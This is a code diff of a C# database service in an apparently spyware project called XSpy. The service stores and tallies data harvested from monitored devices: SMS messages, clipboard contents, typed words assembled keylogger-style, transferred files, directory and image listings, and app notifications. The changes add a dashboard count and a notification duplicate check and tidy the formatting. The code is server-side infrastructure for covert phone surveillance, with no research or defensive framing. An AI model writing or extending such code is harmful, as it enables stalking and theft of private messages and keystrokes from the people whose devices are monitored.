@@ -17,6 +17,7 @@ using XSpy.Database.Services.Base;
 using XSpy.Shared;
 using XSpy.Shared.Models.Requests.Devices;
 using XSpy.Shared.Models.Requests.Devices.Search;
+using XSpy.Shared.Models.Views;
 using File = XSpy.Database.Entities.Devices.File;
 
 namespace XSpy.Database.Services
@@ -25,6 +26,21 @@ namespace XSpy.Database.Services
     {
         public DeviceService(DatabaseContext context, IDistributedCache cache) : base(context, cache)
         {
+        }
+
+        public async Task<DashViewModel> GetDashboardInfo(User loggedUser)
+        {
+            var sms = await DbContext.Messages.Where(s => s.DeviceData.UserId == loggedUser.Id).LongCountAsync();
+            var words = await DbContext.Clipboards.Where(s => s.DeviceData.UserId == loggedUser.Id).LongCountAsync();
+            var devices = await DbContext.Devices.Where(s => s.UserId == loggedUser.Id).LongCountAsync();
+            var files = await DbContext.Files.Where(s => s.DeviceData.UserId == loggedUser.Id).LongCountAsync();
+            return new DashViewModel()
+            {
+                Devices = devices,
+                Files = files,
+                Messages = sms,
+                Words = words
+            };
         }
 
         public async Task<DataTableResponse<DeviceListResponse>> GetTable(DataTableRequest<SearchDeviceRequest> request,
@@ -80,9 +96,10 @@ namespace XSpy.Database.Services
         {
             return DbContext.Devices.FirstOrDefaultAsync(s => s.Id == id);
         }
+
         public Task<List<TempPath>> GetPathsForDevice(Guid id)
         {
-            return DbContext.TempPaths.Where(s=>s.DeviceId == id).Select(s=> new TempPath()
+            return DbContext.TempPaths.Where(s => s.DeviceId == id).Select(s => new TempPath()
             {
                 CanRead = s.CanRead,
                 Name = s.Name,
@@ -186,7 +203,7 @@ namespace XSpy.Database.Services
 
             device.IsLoadingDir = false;
             DbContext.Update(device);
-            
+
             DbContext.TempPaths.RemoveRange(DbContext.TempPaths.Where(s => s.DeviceId == device.Id));
             foreach (var pathData in paths)
             {
@@ -204,9 +221,10 @@ namespace XSpy.Database.Services
 
                 await DbContext.AddAsync(data);
             }
-            
+
             await DbContext.SaveChangesAsync();
         }
+
         public async Task ImageList(string deviceId, List<string> paths)
         {
             var device =
@@ -217,7 +235,7 @@ namespace XSpy.Database.Services
 
             device.IsLoadingDir = false;
             DbContext.Update(device);
-            
+
             DbContext.ImageList.RemoveRange(DbContext.ImageList.Where(s => s.DeviceId == device.Id));
             foreach (var pathData in paths)
             {
@@ -231,7 +249,7 @@ namespace XSpy.Database.Services
 
                 await DbContext.AddAsync(data);
             }
-            
+
             await DbContext.SaveChangesAsync();
         }
 
@@ -271,7 +289,7 @@ namespace XSpy.Database.Services
 
             await DbContext.SaveChangesAsync();
         }
-        
+
         public async Task<File> StoreFile(string deviceId, string savePath, TransferFileRequest transferFile)
         {
             var device =
@@ -288,7 +306,7 @@ namespace XSpy.Database.Services
                 return fileExists;
             }
 
-            var name = Guid.NewGuid().ToString().Replace("-", "").Take(12) + transferFile.Name;
+            var name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 12) + transferFile.Name;
 
 
             var file = new File()
@@ -349,19 +367,25 @@ namespace XSpy.Database.Services
 
             if (device == Guid.Empty)
                 return;
+
+            var checkNotify = await
+                DbContext.Notifications.AnyAsync(s =>
+                    s.DeviceId == device && s.Date == DateTime.Now && s.Content == dataRequest.Content && s.Title == dataRequest.Title);
+
+            if (checkNotify)
+                return;
             
-                await DbContext.Notifications.AddAsync(new Notification()
-                {
-                    Id = Guid.NewGuid(),
-                    CratedAt = DateTime.Now,
-                    DeviceId = device,
-                    Content = dataRequest.Content,
-                    Date = JavaTimeStampToDateTime(dataRequest.PostTime),
-                    Key = dataRequest.Key,
-                    AppName = dataRequest.AppName,
-                    Title = dataRequest.Title
-                });
-            
+            await DbContext.Notifications.AddAsync(new Notification()
+            {
+                Id = Guid.NewGuid(),
+                CratedAt = DateTime.Now,
+                DeviceId = device,
+                Content = dataRequest.Content,
+                Date = JavaTimeStampToDateTime(dataRequest.PostTime),
+                Key = dataRequest.Key,
+                AppName = dataRequest.AppName,
+                Title = dataRequest.Title
+            });
 
 
             await DbContext.SaveChangesAsync();
@@ -520,21 +544,19 @@ namespace XSpy.Database.Services
             if (device == Guid.Empty)
                 return;
 
-            var lastWord = await 
-                DbContext.Clipboards.Where(s => !s.IsClipboard && s.DeviceId == device).OrderByDescending(s=>s.CratedAt).FirstOrDefaultAsync();
-            if (lastWord != null && lastWord.CratedAt.AddMinutes(2) >= DateTime.Now)
+            var lastWord = await
+                DbContext.Clipboards.Where(s => !s.IsClipboard && s.DeviceId == device)
+                    .OrderByDescending(s => s.CratedAt).FirstOrDefaultAsync();
+            if (lastWord != null && lastWord.CratedAt.AddMinutes(2) >= DateTime.Now &&
+                word.StartsWith(lastWord.Content))
             {
-                if (word.StartsWith(lastWord.Content))
-                {
-                    lastWord.Content = word;
-                    lastWord.CratedAt = DateTime.Now;
-                    
-                    DbContext.Clipboards.Update(lastWord);
-                }
+                lastWord.Content = word;
+                lastWord.CratedAt = DateTime.Now;
+
+                DbContext.Clipboards.Update(lastWord);
             }
             else
             {
-
                 var clip = new Clipboard()
                 {
                     Id = Guid.NewGuid(),
